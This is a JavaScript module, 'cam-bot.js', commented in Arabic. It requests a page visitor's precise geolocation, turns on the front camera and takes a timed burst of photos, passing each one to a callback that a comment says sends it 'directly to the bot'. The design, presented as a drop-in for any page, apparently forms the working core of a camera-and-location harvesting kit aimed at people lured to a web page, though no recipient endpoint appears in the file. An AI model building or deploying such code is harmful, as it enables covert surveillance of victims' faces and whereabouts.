// cam-bot.js
// هذا الملف فيه كل شيء يتعلق بطلب الأذونات، الكاميرا، الموقع، والتقاط الصور
// ما راح تحتاج تلمسه كثير، ممكن تستخدمه مع أي index.html

const CamBot = {
  video: null,
  canvas: null,
  stream: null,
  captureTimer: null,
  imagesSent: 0,
  
  // الإعدادات الافتراضية (تقدر تغيرها)
  settings: {
    captureCount: 5,        // كم صورة
    captureInterval: 2000,  // الوقت بين الصور (مللي ثانية)
    imageQuality: 0.75,     // جودة الصورة (0 إلى 1)
    videoWidth: 640,
    videoHeight: 480,
    facingMode: 'user'      // 'user' للكاميرا الأمامية، 'environment' للخلفية
  },

  // دمج الإعدادات المخصصة
  init(customSettings = {}) {
    this.settings = { ...this.settings, ...customSettings };
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvas');
    if (!this.video || !this.canvas) {
      console.error('❌ عناصر video أو canvas غير موجودة في الصفحة');
      return false;
    }
    return true;
  },

  // طلب الموقع
  async getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject('المتصفح لا يدعم تحديد الموقع');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          mapUrl: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        }),
        (err) => reject(this._getLocationError(err)),
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });
  },

  // ترجمة أخطاء الموقع
  _getLocationError(error) {
    switch(error.code) {
      case error.PERMISSION_DENIED: return 'تم رفض إذن الموقع';
      case error.POSITION_UNAVAILABLE: return 'الموقع غير متاح';
      case error.TIMEOUT: return 'انتهت مهلة طلب الموقع';
      default: return 'خطأ غير معروف في الموقع';
    }
  },

  // طلب الكاميرا
  async startCamera() {
    try {
      this.stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: this.settings.facingMode,
          width: { ideal: this.settings.videoWidth },
          height: { ideal: this.settings.videoHeight }
        },
        audio: false
      });
      this.video.srcObject = this.stream;
      await this.video.play();
      console.log('✅ الكاميرا تعمل');
      return true;
    } catch (err) {
      let errorMsg = 'لم يتم السماح بالكاميرا';
      if (err.name === 'NotAllowedError') errorMsg = 'تم رفض إذن الكاميرا';
      if (err.name === 'NotFoundError') errorMsg = 'لم يتم العثور على كاميرا';
      throw new Error(errorMsg);
    }
  },

  // التقاط صورة
  capture() {
    if (!this.video.srcObject || this.video.readyState < 2) return null;
    
    this.canvas.width = this.video.videoWidth || this.settings.videoWidth;
    this.canvas.height = this.video.videoHeight || this.settings.videoHeight;
    this.canvas.getContext('2d').drawImage(this.video, 0, 0);
    
    return new Promise((resolve) => {
      this.canvas.toBlob((blob) => {
        resolve(blob);
      }, 'image/jpeg', this.settings.imageQuality);
    });
  },

  // بدء الالتقاط التلقائي (يرسل مباشرة للبوت)
  startAutoCapture(onCaptureCallback) {
    this.imagesSent = 0;
    
    this.captureTimer = setInterval(async () => {
      const blob = await this.capture();
      if (blob && onCaptureCallback) {
        const shouldContinue = await onCaptureCallback(blob, this.imagesSent + 1);
        this.imagesSent++;
        
        if (this.imagesSent >= this.settings.captureCount || shouldContinue === false) {
          this.stop();
        }
      }
    }, this.settings.captureInterval);

    // التقاط أول صورة بعد 500 مللي ثانية
    setTimeout(async () => {
      const blob = await this.capture();
      if (blob && onCaptureCallback) {
        this.imagesSent++;
        onCaptureCallback(blob, this.imagesSent);
      }
    }, 500);
  },

  // إيقاف الكاميرا والالتقاط
  stop() {
    if (this.captureTimer) {
      clearInterval(this.captureTimer);
      this.captureTimer = null;
    }
    if (this.stream) {
      this.stream.getTracks().forEach(track => track.stop());
      this.stream = null;
    }
    console.log('⏹ تم إيقاف الكاميرا');
  },

  // تشغيل كل شيء مرة واحدة
  async startAll(onProgressCallback) {
    // 1. الموقع
    let locationData = null;
    try {
      locationData = await this.getLocation();
      if (onProgressCallback) onProgressCallback('location', locationData);
    } catch (err) {
      if (onProgressCallback) onProgressCallback('location_error', err);
    }

    // 2. الكاميرا
    try {
      await this.startCamera();
      if (onProgressCallback) onProgressCallback('camera_ready');
    } catch (err) {
      if (onProgressCallback) onProgressCallback('camera_error', err);
      return { success: false, location: locationData, error: err.message };
    }

    return { success: true, location: locationData };
  }
};
